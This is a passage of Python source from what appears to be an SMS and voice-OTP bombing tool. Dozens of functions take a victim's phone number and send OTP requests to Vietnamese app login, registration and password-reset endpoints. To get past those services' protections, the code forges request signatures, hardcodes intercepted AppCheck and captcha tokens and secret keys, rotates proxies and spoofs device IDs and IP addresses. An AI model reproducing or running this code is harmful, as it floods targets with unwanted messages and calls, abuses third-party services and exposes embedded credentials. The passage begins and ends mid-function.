            sign = hashlib.md5(f"{_T24H_L}*|*{secret}*|*{sorted_body}*|*{ts}".encode()).hexdigest()
            r = await client.post(
                f"{_T24H_BASE}/api/user/app/login/sms",
                headers={
                    **_T24H_HEADERS,
                    "X-Firebase-AppCheck": appcheck_tok,
                    "sign": sign,
                    "timestamp": str(ts),
                    "Cookie": f"JSESSIONID={jsessionid}",
                },
                json=body,
            )
            try:
                d = r.json()
                return d.get("code") == 200 or d.get("data") is True
            except Exception:
                return r.status_code == 200
    except Exception as e:
        print(f"[Tien24h] ERR {type(e).__name__}: {e}")
        return False


async def Call_Tien24hPro(phone):
    appcheck_tok = _load_appcheck_token("tien24hpro")
    if not appcheck_tok:
        return False
    body = {"appCode": "tien24hpro", "version": "1.0.0", "mobileType": "1", "phone": phone}
    try:
        async with _make_client(timeout=30, proxy=_current_proxy()) as client:
            rs = await client.get(
                f"{_T24HPRO_BASE}/api/user/app/common/secret",
                headers=_T24HPRO_HEADERS,
                params={"appCode": "tien24hpro", "version": "1.0.0", "mobileType": "1"},
            )
            secret = ""
            if rs.status_code == 200:
                secret = (rs.json().get("data") or {}).get("verifySignSecret", "")
            jsessionid = rs.cookies.get("JSESSIONID", "")
            if not jsessionid:
                import re as _re
                m = _re.search(r"JSESSIONID=([^;]+)", rs.headers.get("set-cookie", ""))
                if m:
                    jsessionid = m.group(1)
            ts = int(time.time() * 1000)
            sorted_body = json.dumps(_t24h_yr(body), separators=(",", ":"))
            sign = hashlib.md5(f"{_T24HPRO_L}*|*{secret}*|*{sorted_body}*|*{ts}".encode()).hexdigest()
            r = await client.post(
                f"{_T24HPRO_BASE}/api/user/app/login/sms",
                headers={
                    **_T24HPRO_HEADERS,
                    "X-Firebase-AppCheck": appcheck_tok,
                    "sign": sign,
                    "timestamp": str(ts),
                    "Cookie": f"JSESSIONID={jsessionid}",
                },
                json=body,
            )
            try:
                d = r.json()
                return d.get("code") == 200 or d.get("data") is True
            except Exception:
                return r.status_code == 200
    except Exception as e:
        print(f"[Tien24hPro] ERR {type(e).__name__}: {e}")
        return False


async def Call_GhiNhanh(phone):
    BASE = "https://api.ghinhanh.com"
    appcheck_tok = _load_appcheck_token("ghinhanh")
    h1 = {
        "Content-Type": "application/json", "lang": "vi_VN",
        "Accept": "*/*", "User-Agent": "IOS",
        "Accept-Language": "vi_VN", "platform": "h5", "app-version": "1.0.2",
    }

    def _ghinhanh_yr(obj):
        if obj is None:
            return obj
        if isinstance(obj, list):
            return [_ghinhanh_yr(x) for x in obj]
        if isinstance(obj, dict):
            return {k: _ghinhanh_yr(obj[k]) for k in sorted(obj.keys())}
        return obj

    try:
        async with _make_client(timeout=15, verify=False, proxy=_current_proxy()) as client:
            rs = await client.get(
                f"{BASE}/api/user/app/common/secret",
                params={"appCode": "ghinhanh", "mobileType": "2", "version": "1.0.2"},
                headers=h1,
            )
            d1 = rs.json() if rs.status_code == 200 else {}
            secret = (d1.get("data") or {}).get("verifySignSecret", "")
            jsessionid = rs.cookies.get("JSESSIONID", "")
            if not jsessionid:
                import re as _re
                m = _re.search(r"JSESSIONID=([^;]+)", rs.headers.get("set-cookie", ""))
                if m:
                    jsessionid = m.group(1)
            if not secret:
                return False
            body = {"appCode": "ghinhanh", "mobileType": "2", "phone": phone, "version": "1.0.2"}
            app_md5 = hashlib.md5(b"ghinhanh").hexdigest()
            ts = int(time.time() * 1000)
            body_sorted = json.dumps(_ghinhanh_yr(body), separators=(",", ":"))
            sign = hashlib.md5(f"{app_md5}*|*{secret}*|*{body_sorted}*|*{ts}".encode()).hexdigest().lower()
            post_headers = {**h1, "timestamp": str(ts), "sign": sign, "Cookie": f"JSESSIONID={jsessionid}"}
            if appcheck_tok:
                post_headers["X-Firebase-AppCheck"] = appcheck_tok
            r2 = await client.post(
                f"{BASE}/api/user/app/login/sms", headers=post_headers, json=body,
            )
        return r2.status_code == 200
    except Exception as e:
        print(f"[GhiNhanh] ERR {type(e).__name__}: {e}")
        return False


async def Call_TuiTien(phone):
    try:
        ts = str(int(time.time() * 1000))
        sign_raw = hashlib.md5(f"{phone}{ts}".encode()).hexdigest()
        headers = {
            "Accept": "application/json", "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "vi_VN", "Content-Type": "application/json; charset=utf-8",
            "User-Agent": "IOS", "lang": "vi_VN",
            "timestamp": ts, "sign": sign_raw, "Connection": "keep-alive",
        }
        body = {
            "appCode": "tuitien", "phone": phone, "version": "1.0.1",
            "phoneMark": str(uuid.uuid4()).upper(), "mobileType": 1, "smsType": 1,
        }
        async with _make_client(verify=False, timeout=20, proxy=_current_proxy()) as client:
            r = await client.post(
                "https://api.tui-tien.com/api/user/app/login/sms",
                headers=headers, json=body,
            )
        try:
            d = r.json()
            ok = d.get("code") in (0, 200, "0", "200") or d.get("success") is True
        except Exception:
            ok = r.status_code == 200
        print(f"[TuiTien] {r.status_code} | {r.text[:120]}")
        return ok
    except Exception as e:
        print(f"[TuiTien] ERR {type(e).__name__}: {e}")
        return False


# ── Izion24 (Firebase AppCheck + x-secret-key) ──
_IZION24_API        = "https://api.izion24.com.vn"
_IZION24_SECRET_KEY = "vKqflXfgd9KGuj2UYnkwVhX4C2s2yn"

_IZION24_FIXED_APPCHECK = (
    "eyJraWQiOiJrMnhhbUEiLCJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9."
    "eyJzdWIiOiIxOjc2NTA5OTM0MTUyNDppb3M6YWQwZjA2YjAxZDczZTIzYjI3MmQ0MSIsImF1ZCI6WyJwcm9qZWN0cy83NjUwOTkzNDE1MjQiLCJwcm9qZWN0cy9pemlvbjI0Il0sInByb3ZpZGVyIjoiZGV2aWNlX2NoZWNrX2FwcF9hdHRlc3QiLCJpc3MiOiJodHRwczovL2ZpcmViYXNlYXBwY2hlY2suZ29vZ2xlYXBpcy5jb20vNzY1MDk5MzQxNTI0IiwiZXhwIjoxNzgzOTQxMTQ3LCJpYXQiOjE3ODM5Mzc1NDcsImp0aSI6InFUUkhsbEF1Ul9PX3o2VTBsaF9VazFpRHVsQmdJaFR5bmJjT3Q2d2k2MVkifQ."
    "VqU4AdgSJA_u9eyrccezWh8ZkuG1uAeGx2DsoFI3JUuWXTkWOtjmUWWyZ90ffwsrIud5TmQaXJWaorvZ34s5NQSGuba7uhj7EBzxvJW5aI6YtzDg2EfeysElU9A0c-cYVqCiublwXNHjRwO5zWTEIl-cT7LlmMqelQRiVGcFJ1Se_pWXYiodtO3w9NM_PQvoa6fMr0muuGMTfERL1mpaoQ1Nkkcw1dBXskNZpgCMljtOnXHNuib8-fvKpWMKw8E802rCt2weC1ewrO-lxCjm9ZO4v19KhzZLq5b19SNUEUpJpgrYW_TaniYN2GK8gYzmT2TaqfXLtEWadObJ4xQD6y0FeyF65g9Alm_uYvPgcX_cS4KsOies6c_9JWRdJvcz-ieH0Iv2dRX1pJu50q8EgPMDXGuk8--qvupaIo2iWNnz_3EknzDuXvknitW7Yx1YrKWVp8Bh5O_4SUfwJ2VBHKUhiD9kEH_K79VaiSlvpaNb5qFxk8AABNIL8r8gMxH6"
)


def _izion24_headers(device_id: str, ua_suffix: str) -> dict:
    return {
        "Content-Type": "application/json",
        "Accept": "application/json, text/plain, */*",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "vi-VN,vi;q=0.9",
        "Connection": "keep-alive",
        "x-secret-key": _IZION24_SECRET_KEY,
        "User-Agent": f"Izion24/ios-1.0.199.206-{device_id}-iPhone13,3-{ua_suffix}",
    }


def _izion24_token_valid(tok: str) -> bool:
    try:
        import base64 as _b64, json as _j
        parts = tok.split('.')
        pad = parts[1] + '=' * (4 - len(parts[1]) % 4)
        data = _j.loads(_b64.b64decode(pad))
        return data.get('exp', 0) > time.time()
    except Exception:
        return False


async def _izion24_send(phone: str, voice_provider: str, is_resend: bool, ua_suffix: str, label: str) -> bool:
    appcheck_tok = _IZION24_FIXED_APPCHECK
    if not _izion24_token_valid(appcheck_tok):
        print(f"[{label}] SKIP — AppCheck token đã hết hạn, cần lấy token mới từ thiết bị iOS (intercept x-firebase-appcheck)")
        return False
    device_id = str(uuid.uuid4()).upper()
    phone_fmt = phone if phone.startswith("+84") else ("+84" + phone.lstrip("0"))
    headers = _izion24_headers(device_id, ua_suffix)
    headers["x-firebase-appcheck"] = appcheck_tok
    body = {
        "mobileNumber": phone_fmt,
        "voiceProvider": voice_provider,
        "isOtpResend": is_resend,
        "language": "vi",
        "deviceId": device_id,
        "isConsentChecked": True,
    }
    try:
        async with _make_client(timeout=20, proxy=_current_proxy()) as client:
            r = await client.post(
                f"{_IZION24_API}/auth/generate-otp",
                headers=headers,
                json=body,
            )
        print(f"[{label}] {r.status_code} | {r.text[:120]}")
        return r.status_code == 200
    except Exception as e:
        print(f"[{label}] ERR {type(e).__name__}: {e}")
        return False


async def Call_Izion24_SMS(phone):
    return await _izion24_send(phone, "sms", False, "LogIn", "Izion24-SMS")


async def Call_Izion24_Voice(phone):
    return await _izion24_send(phone, "smartbot", True, "LogInOTP", "Izion24-Voice")


_GT365_CAPTCHA_REGISTER = (
    "0cAFcWeA5V0KKBR1dhsWQqK2M6YSWs9FjusR55_7wn9quvFPGuNvvLPNfZ2tFm8syPqwNhlhN7IwOmRYVVgaubs3SAsoHnCzVS79G7YKk"
    "L8e394Nda1yQohnRzt7SC7CN_C5MO5xUKcYNB9J9wnX4jA9l2BJeApy3NzAZA5ygsUeAKaj6lr3Gii7NtZEn814yoWTLOxCnPzTsmvWIDa"
    "_OhRkZbQqqxGPUVIk574DDxPBd2biM-LvbczoVLMuIh97Vd8ac3Cy5PQ95hPfkx7Fd2CxG_lVK9ipnwli3cJuO10w9_-zZlRv5Ikc-08f"
    "RsnJ1qRHU1hDRqz2ll284qOiGFOWqP8XDeRXEvkzf3MD9_udwGmTDhPQnX6_rWE7L03q1XGJf_K0ILdxuG0gBJS_R1Tpfxvr9B4UmkI_Y"
    "OJZHY2JWW2jbbXQ_2TqJ5ZKjbhEu0QJcr7Pgm4jTR8YlUv-D6PjsiAJd8CTmEzy0FG0xzTx-f1a1K5MPsRcxbTbGu24WTvrcX6lq4WsXY"
    "dGotfi_amW4x4UbiGObjrxl_iltc5Gaoo5vBzevalidkxC2m0sIVSWV3JkaQTFgnmWZD550eMGOE9gHwPj744cl4evNU0kWEl-OMDXrd8GW"
    "dz_h_bQuSgIYJCjvsquZSL0b3org-QekrfpoRWMcWbDUlpR05rOZjnLZLN1t3VN_qn44-hQJI9oHZCh3-f4sxvKSSFLXgjQd-i55b-2NOi"
    "pWaysGpATOuWNTuHJk6GPe88tXtJc05UcfDhe2MgBaz-IzWsuX0SwIpSsAKUAG8yiAFH9W1xj64mvEHIS1V1GKcXXoOMYYHT0HUVC8Rat5"
    "PBAwI5wu4NdGK3WSiy9DTeJ0UuQVCZt4RHP5XwmSXva1gkGEun-VQqNE4QrY6TQtBcL3PZO8I6znN6JVc00fquT85FAbXCE1XhHYjgO6e"
    "sWAMbHQXDRxBLA7IT_t7xfk3jn7yxVSfTIdEw0EMnQzl-xLJItcaUTErFKgql338xkvdwchWZT7dqz2vhQB1J9Isy5dCvagOocPgh0wHY"
    "K6QHXI7_36N1pnMN4T-O5AAOY4VMxONh8DPKVAWOUuavwP498De1DqX8pPRcAqAyGP5JTslaHPvOZ6M3ZAM8rVdakW90mowyrFiMulnjn"
    "Jb_qovVYS7ogdcmqhUPXZWFeMOfOXI6GPAL71W3p5A9YOGBqdVBI27pxTE0PbTfqC9wIJ8iDXV2y0AsRFI7wGXf1a73BlpBEWx158Y8Gy"
    "d9-itgb3A25pNHIy7Xc4pf2EpnPjiQKy4Ti30BjML4MWNhEExMlLOyOuFiAIlchaBZVEim7GFOhB65ZIgzOS-MU5FNJGYEU9NDA6YbJ6M"
    "8W8RrthHo440s4oJP7P_DxD6CbnGJwARlF9d8lSXeRvvRUI6e_8GK2M_PlMNEEgsJ-fKc3jPdpeY5CpU9p-BDJWv-EPKoHjPkiEiqZKkH"
    "4r6P5764Ry5cd1uLB2Wshrso_xBqUr0A33c9mIF7sGR7o2dLrXvBRKgiVImWaCtKSHEGLV8_fmeyjXqjNbtquscLYqQMo5oeez7St56kUK"
    "9Mxl27zMPiMBqtr6QXakuuHFehHqW0e1RJaseIktPESIKq6fKP8ATUYT2X2ZXv5IFdnj-wSljPEMNQlaabwrkEs99UjopZXOajzl-kMZgn"
    "CxgcoHQs6CcKhlW3L9lQYDMg0UtswFq1m1a0ED5KI6HJfb0nFN3HAcuQFo1SZGtwVZXbbxoAzde_36CMis2rDz99My0vnX4ozdcNN0vk13"
    "2rfKG5_uc0L_AbaeXIbe-Fc6x9hSl4gvMDqGjzC8jbQt-NbG6nQpqZeJtkzdcVHPSzgebuE5jtTFAfXr92n9jTMwMZEsGnP-UruYExC7t"
    "uKwUBzOK01LjjTNgR3SMO3OjfginYJhSSnoplGG2b8rUhuJRXQC7x6K9lnxuILGZtj0EOTUTRHdiJmR_CXaj5U-fvZbB7zWJvn3N8fWBQ"
    "dJhZqz0_xNCLDg_ZDVFoUBYugnHdHZ-Kb9jbh5iNliIm9X6VoGAquBYaflmGvp3Da-auS1Izr4pRsmop5TvO-L0SgyBUUhXp9q5g8K7_y"
    "s-WcechwMe8q2sqqGzKOqD7NJ6VayVS6h0c253_yOe7lFNHKkNGx1NtKU-Rl1UppRaHctQabDLXVhopmoiczePW-i82nc51EDLQE2XNm9O"
    "ZE4ebAc1FVSd46Reocj-TeyWw0kQoUd8c_BQaDZpTDDCTKvxwqA9HHXWTx8X1n0_Mrboqs2rtyFNS_tUfdxfn1h9FiyKCnh-m5HSSErYo"
    "onqsEYEh2E3TTg-u2h6rOnda0098oLo_0d8zJGCtWW9nolKWY17ihDYp4-45gTW3k8-UIGxbN0WanZmxUmeb509D-bqRJbNwbmTa7Yd4GX"
    "q5uIVyUjOFj6CeA2soktM78gfnZKy_2F0bCF1ZLHK9zcZDJwar0C2t0LywmVgIm5YudMXcbQ3GUiT9qycrenPxo8UZBuHFhR3cHdFLRdY"
    "0h6ADlzYmQ9iaHmVBawuhRA"
)

_GT365_CAPTCHA_FORGOT = (
    "0cAFcWeA6PyOWMfahX_TCH8DNAitRIiEEElFjBSAg-SFDD6eyztRm9q0nvtL-2eJTXXsXPSX-hlUBVvs_qNgnzBFJiS8ujc4L3KkhnhHNQ"
    "bFSel-X9ktIgHpiRS7JVwtB6wW5uVaYRrXVxmFGwox9tbCtVVoyIVgRKjGtpZaWcmPF1hgRYcGx31PrO_JsHeLHqzBo8MactK3UjflxAy"
    "PhCtkVCMwoJyx5DGv3w9hjzLa8NV1OIrD7ux2vPFcZ8vhcL-sKqkY9gmgF5rKsyJZxXC939B4ezVfYpInEkV64SI7eJHhxmQ0HpoBuGu5"
    "a9M1R8UAvjj38Y09weIn_TPyZ-RgDE80CUKDvazvskLP4kfJ-knHyQNsuspLf2umu-Xoohz2IhSMC9EUTeBTv_lgWqCEbGgpxplGUpKMNm"
    "7vCEtQw744CDgVubJ4Cmq9ACWFDFO4lIihCTxmMzwIBc4xTxIPdu1I32KAN74yXZ14gAFyvea_kA0b7gWNh3VvGlhg3ZVpMbNzQqeplnTI"
    "lrt5CVa6m0wj4hG4xINfPKDRFeBYIipyHFk-I1Oq4ckAbt_Mr1WjmW2aaurTPR020LwKjyD2J_ZR45YOwX1Q7H7H9eAmRdyq8pucDWu0P"
    "ianMpcHPVAfcXcxJJiF0YtBZ3WXfSp4Yr9S7PLhiXNasAS_NDj4lGQ0XXKxzq5K3sJyQr9SGyodwRGnBw63f4uYvz0GhNvB4-hFAcNDvi"
    "jV5O0QpMxfmhdyzw9nzD4RfkLtgoXukANAwX5cFjoCSyZV10-TcFOcimavQyz4YXD47MiagDqnpcUSpSWvqv4RUbJVm4H_AFTtU46IcoaN"
    "3hUqNiyotHk5ZbM_PsMIUWCiUkiPrnz1QLKMQ1QvJXjQHEOBU4Lylc3RQqMbRMG8KLpsaEjBbzVroYticfhW-41jQzgMsJbmfs7MUj7VR"
    "G2WL3k7YoT-fR1ttvhuDCKO2UNCaLcKZNI9UJSDQqndaniLeSReiREIToL0BckvOay3vV8JdeZ7wklQuwPDGxAtbZ6fZwz8zCud8yh0bL6"
    "n_5AdWmoWHN-ye5CnSfFAU3QJ7CjwxEtJ91H_cg--N4EoF-PXdsIKOhJHAgjgiT_rwId8YGQJ22pSwSwB_zkGEqeZI2TBuyTf8aQY4euO"
    "jY-E1QpP4JQ82Mra7X4ClUYmAd_7n7KYXq3SUPvhScROoGtYAWeJiFwlxL8z5OfQlqtMgqsjgJK8N14SCNPaTJ9Ihep2sP1rQ0CPxVdqW"
    "px-9Gtgq1WgApzZfuhjJp3U6EmOtAnqloptAkEhGAV_2gzVkA4eIXil5uBr_l7VEZTnUBVDoAeUo0IpXnARsgD7RuL86s1ZCEJvaE3kI1"
    "vYzIG-atF9iRzmYoFQd7jk4jZ7NZ-qDvEliSbm2cjwUPQpKTQcY_P5BV6krGQlDVl9wGq0w56KdZV8HH2Q4-EzwotdrjEMUmVJdzCcVDR"
    "1DxSSUJPgJD8m0OcDdkv3gum3PFkyj0AsPt7WLMZEHZy2J2krkvWa2-w8mj1bgoTwZ4_KbmcHMS-LcwjvSjv0044zo_aistTH1tsT5ygp"
    "N5iKf7_4fhk9-RXmUVyFWkqJLamDjFBW7QENDkuoJ_B4ePuz2ZSyOIf_9iLeLtiWXiSOZ8JpfAm5JC0SfA_hVh3TjqdbJw5VsnXTSXq0"
    "wDgYBr0oJhAjc_9zag-71RWkyfEERdiDyaYhtX623dATTW6U1aQ0N2jvDWf0GavJS7sshWxrZU1FWWZGxCd2ZOvxbG7uC53_f1sATk4fR"
    "XHSD2gHVAdp6ZEn7-oIJMvsRt7GOWMNJEPSeU3EARM2MCmIo4GAhOuEyE1UKO6UKVjwmZnSPOCUd1icnzViPo1ShfLlPg7r1IBRT9bcwQ"
    "1cfGFl-giNKCbK1jiId0_yD8KMfPIp2EyiQGTBcuf7qmmv3kM7_bR31uWG-0dA1-gZRuApjWDbjjqDLJ1KcX5BMpxeNho8t1fhFPPemS2"
    "_AdJSF06pLkYSnLG4ck2zw57XuLTIvREB3OtUBEovyNlSkPhwlFcc3oJwZcWwK4KlirSYJ-wYwZksiKYuErvpuEYqmfv1MZkkWNJBIN1s"
    "33ePAH_-LxTnFhLWiGhLQkr1l2BWABNIWRmUZeTU__WDshl_EeAWglfJQ0p_nVl8SuSmOn6UOmhZaHWhCGSh9Lnlx7gYlG2zHEREzJqUm"
    "08UbQr8ffE3Gd-bl45dvUpq0TKxjxXA1-D0NYqOsjZ9b-vzmBTd-J7eq3oA58m9aCHXmKzuls_A9tWL49qKY6Yjf_O-sImItPUQ1Jo_J0"
    "5EQr4IOpWDjqoGVRpjK5U2fXS0xDi46WZzpJ8_gQX5rcLawJNlB-_Hr7MZYvZTVM1hBpIh7LNvvCL63b9YX2gf0goL9ao1yZyP4QOoBwH"
    "deNxIBFFRG7rrU0gwnOFMY0cryq-vHmYuvaCMS0j5vLKRcoMoLQzqD24EWJ1XKD_gDGaIjnL3dJJbemWLytx3wALBwHBuubBhJSvseJr7"
    "a4HHGTUwnwlDNOFWmnpukL7_uM8FvcEv3AekB-iQZj_RrqU5QiQVjUdgc0GGs88Hl-DYG9IIqrooK6hVYtHIFG4K_7JiMX0EnvijNn94H"
    "sd_0N1rgwCl6CMUBwPCjUXDLCrOQkzjoNuSAeOEQMj4fUS4KwNtlf4vfPbjgEadnCVu8adXxZ16pDIHK8WA1MOym2pEq8zEZwX3rhMX6y"
    "hnObyzctSxzRccUjFF6J9S2Qk9AqX_iPZsbmMWFXYm9JPN8eYiWRmw"
)


def _gt365_headers(device_id):
    return {
        'Accept': 'application/json,text/plain,text/html',
        'X-Client-Model': 'iPhone 12 Pro',
        'X-Client-Version': '18.1',
        'X-Client-OS': 'iOS',
        'Accept-Language': 'vi-VN,vi;q=0.9',
        'Content-Type': 'application/json',
        'User-Agent': 'Trafic365/1 CFNetwork/1568.200.51 Darwin/24.1.0',
        'X-Device-Id': device_id,
        'X-App-Version': '2.0.3',
    }


async def giaothong365_register(phone):
    phone_fmt = phone if phone.startswith('0') else '0' + phone.lstrip('0')
    device_id = str(uuid.uuid4()).upper()
    captcha = _load_gt365_captcha() or _GT365_CAPTCHA_REGISTER
    try:
        async with _make_client(timeout=15, follow_redirects=True, verify=False) as client:
            await client.get(
                'https://api-v2.giaothong365.vn/app/config/api/v1.0/p/all?platform=ios',
                headers=_gt365_headers(device_id),
            )
            resp = await client.put(
                'https://api-v2.giaothong365.vn/openid/api/v1.0/account/p/register/request-otp',
                headers=_gt365_headers(device_id),
                json={'phoneNumber': phone_fmt, 'captchaToken': captcha},
            )
            data = resp.json().get('data', {})
            ok = resp.status_code in (200, 201) or data.get('errorCode') == 400001000
            print(f"GT365-Register | {'OK' if ok else 'X'} [{resp.status_code}]")
            return ok
    except Exception as e:
        print(f"GT365-Register | ~> Lỗi: {type(e).__name__}: {e}")


async def giaothong365_forgot(phone):
    phone_fmt = phone if phone.startswith('0') else '0' + phone.lstrip('0')
    device_id = str(uuid.uuid4()).upper()
    captcha = _load_gt365_captcha() or _GT365_CAPTCHA_FORGOT
    try:
        async with _make_client(timeout=15, follow_redirects=True, verify=False) as client:
            await client.get(
                'https://api-v2.giaothong365.vn/app/config/api/v1.0/p/all?platform=ios',
                headers=_gt365_headers(device_id),
            )
            resp = await client.put(
                'https://api-v2.giaothong365.vn/openid/api/v1.0/account/p/forgot-password/request-otp',
                headers=_gt365_headers(device_id),
                json={'phoneNumber': phone_fmt, 'captchaToken': captcha},
            )
            ok = resp.status_code in (200, 201)
            print(f"GT365-Forgot | {'OK' if ok else 'X'} [{resp.status_code}]")
            return ok
    except Exception as e:
        print(f"GT365-Forgot | ~> Lỗi: {type(e).__name__}: {e}")



_VUIAPP_URL = "https://api-vncdn.vuiapp.vn/graphql"


def generate_vuiapp_headers():
    device_id = str(uuid.uuid4()).upper()
    trace_id = uuid.uuid4().hex
    span_id = uuid.uuid4().hex[:16]
    cfnet, darwin = random.choice(_IOS_CFNETWORK)
    return {
        "Host": "api-vncdn.vuiapp.vn",
        "Accept": "*/*",
        "Accept-Language": "vi-VN",
        "Accept-Encoding": "gzip, deflate, br",
        "Content-Type": "application/json",
        "Connection": "keep-alive",
        "User-Agent": f"RNClientApp/20260507113653 CFNetwork/{cfnet} Darwin/{darwin}",
        "x-app-version": "4.39.70",
        "x-platform": "ios",
        "x-device-id": device_id,
        "x-format-money": "json",
        "x-debug-otp": "false",
        "sentry-trace": f"{trace_id}-{span_id}",
        "baggage": f"sentry-environment=production,sentry-release=vn.vuiapp.m%404.39.61%2B20260325125922,sentry-public_key=2001cef5546e49dc843c73b5edd45a9a,sentry-trace_id={trace_id},sentry-org_id=402372"
    }

async def Call_VuiApp0(phone):
    headers = generate_vuiapp_headers()
    payload = {
        "query": "mutation resendAuthenticationOTP($payload: RequestResendOtpPayload!) {\n  requestResendOtp(payload: $payload) {\n    otp {\n      success\n      debug_otp\n      retryAfter\n      __typename\n    }\n    debug_otp\n    __typename\n  }\n}\n",
        "variables": {"payload": {"otpMethod": "Voice", "otpLength": 6, "phoneNumber": phone}},
        "operationName": "resendAuthenticationOTP",
    }
    try:
        async with _make_client(timeout=httpx.Timeout(30, connect=10), proxy=_current_proxy()) as client:
            r = await client.post(_VUIAPP_URL, headers=headers, json=payload)
        otp = (r.json().get("data") or {}).get("requestResendOtp") or {}
        ok = bool((otp.get("otp") or {}).get("success") or otp.get("debug_otp"))
        print(f"[VuiApp0] {r.status_code} | {r.text[:120]}")
        return ok
    except Exception as e:
        print(f"[VuiApp0] ERR {type(e).__name__}: {e}")
        return False


async def Call_VuiApp(phone):
    headers = generate_vuiapp_headers()
    phone_fmt = phone if phone.startswith("+") else f"+84{phone.lstrip('0')}"
    payload = {
        "query": "mutation resendAuthenticationOTP($payload: RequestResendOtpPayload!) {\n  requestResendOtp(payload: $payload) {\n    otp {\n      success\n      __typename\n    }\n    __typename\n  }\n}\n",
        "variables": {"payload": {"otpMethod": "Voice", "otpLength": 6, "phoneNumber": phone_fmt}},
        "operationName": "resendAuthenticationOTP",
    }
    try:
        async with _make_client(timeout=httpx.Timeout(30, connect=10), proxy=_current_proxy()) as client:
            r = await client.post(_VUIAPP_URL, headers=headers, json=payload)
        otp = (r.json().get("data") or {}).get("requestResendOtp") or {}
        ok = bool((otp.get("otp") or {}).get("success") or otp.get("debug_otp"))
        print(f"[VuiApp] {r.status_code} | {r.text[:120]}")
        return ok
    except Exception as e:
        print(f"[VuiApp] ERR {type(e).__name__}: {e}")
        return False


async def Call_VuiApp1(phone):
    headers = generate_vuiapp_headers()
    phone_fmt = phone if phone.startswith("+") else f"+84{phone.lstrip('0')}"
    payload = {
        "operationName": "requestChangePassword",
        "variables": {"phoneNumber": phone_fmt, "otpLength": 6},
        "query": (
            "mutation requestChangePassword($phoneNumber: PhoneNumber!, $otpLength: Int) {\n"
            "  requestChangePassword(phoneNumber: $phoneNumber, otpLength: $otpLength) {\n"
            "    requestId\n    otp { success retryAfter __typename }\n    __typename\n  }\n}\n"
        ),
    }
    try:
        async with _make_client(timeout=httpx.Timeout(30, connect=10), proxy=_current_proxy()) as client:
            r = await client.post(_VUIAPP_URL, headers=headers, json=payload)
        otp = (r.json().get("data") or {}).get("requestChangePassword") or {}
        ok = bool((otp.get("otp") or {}).get("success"))
        print(f"[VuiApp1] {r.status_code} | {r.text[:120]}")
        return ok
    except Exception as e:
        print(f"[VuiApp1] ERR {type(e).__name__}: {e}")
        return False


def _vnadmin_sign(data: dict, secret: str) -> str:
    sorted_obj = {k: data[k] for k in sorted(data.keys())}
    step1 = hashlib.md5(json.dumps(sorted_obj, separators=(",", ":")).encode()).hexdigest()
    step2 = hashlib.md5((step1 + secret).encode()).hexdigest().upper()
    return step2[::-1]


async def _vnadmin_request(phone, appkey, origin, url, secret):
    mob = "84" + phone.lstrip("0") if not phone.startswith("84") else phone
    data = {"mobilenumber": mob, "AppKey": appkey, "loading": True}
    data["sign"] = _vnadmin_sign(data, secret)
    try:
        async with _make_client(timeout=30, proxy=_current_proxy()) as client:
            r = await client.post(
                url, json=data,
                headers={
                    "Accept": "*/*", "Content-Type": "application/json",
                    "Origin": origin, "Referer": origin + "/",
                    "lang": "vi_VN",
                    "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1",
                    "Sec-Fetch-Site": "same-site", "Sec-Fetch-Mode": "cors",
                    "Sec-Fetch-Dest": "empty", "Accept-Language": "vi-VN,vi;q=0.9",
                    "Priority": "u=3, i", "Accept-Encoding": "gzip, deflate, br",
                },
            )
        return r.status_code == 200
    except Exception as e:
        print(f"[vnadmin/{appkey}] ERR {type(e).__name__}: {e}")
        return False


async def vnadmin_1(phone):
    return await _vnadmin_request(
        phone, "App1749282714",
        "https://internal.vnadmin.top",
        "https://api3.vnadmin.top/login/getSmsCode",
        "A2D2E55EB0A02888",
    )


async def vnadmin_2(phone):
    return await _vnadmin_request(
        phone, "App1715327022",
        "https://luckyv2.vnadmin.top",
        "https://api.vnadmin.top/login/getSmsCode",
        "A2D2E55EB0A02666",
    )


async def vnadmin_3(phone):
    return await _vnadmin_request(
        phone, "App1715922397",
        "https://moneytreev2.vnadmin.top",
        "https://api2.vnadmin.top/login/getSmsCode",
        "A2D2E55EB0A02777",
    )



async def vaygo(phone):
    phone_formatted = phone.lstrip("0")
    url = "https://api.vaygovn.com/v1/login/send/msm"
    headers = {
        "Host": "api.vaygovn.com", "Accept": "*/*",
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": random.choice(_XMH_UA_POOL),
        "Referer": "https://api.vaygovn.com/",
        "Accept-Language": "vi-VN,vi;q=0.9", "Priority": "u=3, i",
    }
    data = {
        "phone": phone_formatted, "type": "2",
        "chntoken": "", "sourse": "1",
        "ip2": get_random_ip(), "ip3": get_random_ipv6(),
    }
    try:
        async with httpx.AsyncClient(timeout=30, http2=False, proxy=_current_proxy()) as client:
            response = await client.post(url, headers=headers, data=data)
        print(f"📡 Status: {response.status_code}")
        return response.status_code == 200
    except Exception as e:
        print(f"❌ Unexpected Error: {e}")
        return False


async def anvay(phone):
    phone_formatted = phone.lstrip("0")
    url = "https://vnapi.anvay.asia/v1/login/send/msm"
    headers = {
        "Host": "vnapi.anvay.asia", "Accept": "*/*",
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": random.choice(_XMH_UA_POOL),
        "Referer": "https://vnapi.anvay.asia/",
        "Accept-Language": "vi-VN,vi;q=0.9", "Priority": "u=3, i",
    }
    data = {
        "phone": phone_formatted, "type": "2",
        "chntoken": "", "sourse": "1",
        "ip2": get_random_ip(), "ip3": get_random_ipv6(),
    }
    try:
        async with httpx.AsyncClient(timeout=30, http2=False, proxy=_current_proxy()) as client:
            response = await client.post(url, headers=headers, data=data)
        print(f"📡 Status: {response.status_code}")
        return response.status_code == 200
    except Exception as e:
        print(f"❌")
        return False


async def vaysuoi(phone):
    phone_formatted = phone.lstrip("0")
    url = "https://api.vaysuoi.com/v1/login/send/msm"
    headers = {
        "Host": "api.vaysuoi.com", "Accept": "*/*",
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": "https://vaysuoi.com",
        "User-Agent": random.choice(_XMH_UA_POOL),
        "Referer": "https://vaysuoi.com/pages/v1/register/",
        "Accept-Language": "vi-VN,vi;q=0.9", "Priority": "u=3, i",
    }
    data = {
        "phone": phone_formatted, "type": "2",
        "chntoken": "", "sourse": "1",
        "ip2": get_random_ip(), "ip3": get_random_ipv6(),
    }
    try:
